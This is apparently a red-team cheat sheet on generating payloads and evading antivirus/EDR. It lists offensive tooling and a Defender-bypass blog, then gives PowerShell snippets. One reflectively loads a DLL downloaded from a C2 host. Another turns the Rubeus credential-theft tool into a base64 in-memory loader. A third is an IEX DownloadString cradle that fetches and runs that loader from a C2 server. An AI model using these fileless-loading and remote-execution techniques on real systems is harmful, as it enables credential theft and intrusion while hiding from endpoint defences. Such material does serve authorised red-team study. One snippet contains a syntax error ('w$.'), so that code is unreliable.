# Payload Generation & AV/EDR Evasion Tips + Devops


## Tools
* [OffensivePipeline](https://github.com/aetsu/OffensivePipeline)
* [ConfuserEx](https://github.com/mkaring/ConfuserEx)
* [PowerStrip](http://github.com/Yoda66/PowerStrip)
* [NetLoader](https://github.com/Flangvik/NetLoader)
* [SharpPack](https://github.com/mdsecactivebreach/SharpPack)

---
## Awesome Resources:
* [Arty-hlr - How to bypass Defender in a few easy steps](https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/)

---
## Loading via System Reflection Assembly[^1]
### Load DLL
```
$w = new-object system.net.webclient
$p = w$.Downloaddata("https://c2.domain.com/dllfile")
[system.reflection.assembly]::Load($p)
$a = new-object namespace.class
$a.method()
```

### Example: Rubeus[^2]
* Convert Exe file to Base64 via powershell
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt
```
* Create a `ps1` file (i.e. *rubeus.ps1*) with the contents below but replace the `<BASE64dRubeus>` with the base64 output of the command above (`rubeus.txt`)
    * This step will save a lot of time rather than executing the base64 output directly and pasting a lot of characters to your (remote) powershell terminal.
```powershell
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("<BASE64dRubeus>"))
```
* Download via your c2
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://<c2>:443/rubeus.ps1")
```

[^1]: [Move Aside Script Kiddies–Malware Execution in the Age of Advanced Defenses | Joff Thyer ](https://www.youtube.com/watch?v=wTmQ5FaRmf4)
[^2]: [Github - Ghostpack - Rubeus](https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell)
